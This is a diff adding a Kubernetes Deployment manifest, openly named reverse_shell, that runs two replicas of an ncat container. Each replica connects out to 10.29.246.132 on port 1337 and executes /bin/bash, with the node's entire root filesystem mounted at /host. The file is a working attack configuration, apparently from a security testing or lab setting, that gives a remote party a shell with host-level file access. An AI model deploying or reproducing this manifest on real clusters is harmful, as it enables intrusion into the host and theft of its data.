@@ -1,0 +1,26 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: reverse_shell
+spec:
+  selector:
+    matchLabels:
+      app: reverse_shell
+  replicas: 2
+  template:
+    metadata:
+      labels:
+        app: reverse_shell
+    spec:
+      containers:
+      - name: ncat-reverse-shell
+        image: raesene/ncat
+        volumeMounts:
+        - mountPath: /host
+          name: hostvolume
+        args: ['10.29.246.132', '1337', '-e', '/bin/bash']
+      volumes:
+        - name: hostvolume
+          hostPath:
+            path: /
+            type: Directory
